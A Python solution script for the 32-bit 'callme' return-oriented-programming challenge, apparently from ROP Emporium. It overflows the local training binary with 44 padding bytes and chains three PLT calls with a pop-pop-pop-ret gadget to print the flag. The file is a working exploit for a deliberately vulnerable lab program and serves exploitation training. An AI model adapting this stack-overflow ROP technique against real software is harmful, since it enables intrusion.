import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./callme32"


# Function addresses from the PLT table:
# rabin2 -i ./callme32 | grep "callme_one" | awk '{print $2}'
F1_ADDR = struct.pack("<I", 0x080484F0)
# rabin2 -i ./callme32 | grep "callme_two" | awk '{print $2}'
F2_ADDR = struct.pack("<I", 0x08048550)
# rabin2 -i ./callme32 | grep "callme_three" | awk '{print $2}'
F3_ADDR = struct.pack("<I", 0x080484E0)

# Values obtained from the task descrition:
A1 = struct.pack("<I", 0xDEADBEEF)
A2 = struct.pack("<I", 0xCAFEBABE)
A3 = struct.pack("<I", 0xD00DF00D)

# ROP Gadget to jump three steps on stack (to skip 3 arguments, placed on stack):
# ROPgadget --binary ./callme32 | grep -P ": pop \w+ ; pop \w+ ; pop \w+ ; ret" | grep -o -P "0x\w+"
POP3 = struct.pack("<I", 0x080487F9)

JUNK = b"A" * 44

pop_and_args = POP3 + A1 + A2 + A3
f1_call = F1_ADDR + pop_and_args
f2_call = F2_ADDR + pop_and_args
f3_call = F3_ADDR + pop_and_args
payload = JUNK + f1_call + f2_call + f3_call

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
